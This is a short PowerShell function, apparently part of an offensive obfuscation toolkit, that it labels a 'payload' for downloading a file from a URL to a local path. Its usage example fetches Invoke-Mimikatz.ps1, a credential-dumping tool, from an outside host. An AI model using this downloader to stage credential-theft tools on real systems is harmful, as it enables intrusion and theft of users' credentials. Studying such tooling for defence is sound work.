function Obf-Download-File
{
<#
.SYNOPSIS
Custom Payload to download a file from a URL in a given directory.

.DESCRIPTION
This payload downloads a file from a URL to the given location.

.PARAMETER URL
The URL parameter defines the file to be downloaded.

.PARAMETER FULL_PATH
The FULL_PATH parameter defines the name and where the file will be downloaded.

.EXAMPLE
PS > Obf-Download-File "https://mysite.co/Invoke-Mimikatz.ps1" "C:\Users\user\Downloads\script.ps1"

.LINK
https://github.com/FabianConP/ObfuscationCode
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $URL,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FULL_PATH
    )

    # Downloads a new file
    (New-Object System.Net.WebClient).DownloadFile($URL, $FULL_PATH)

}


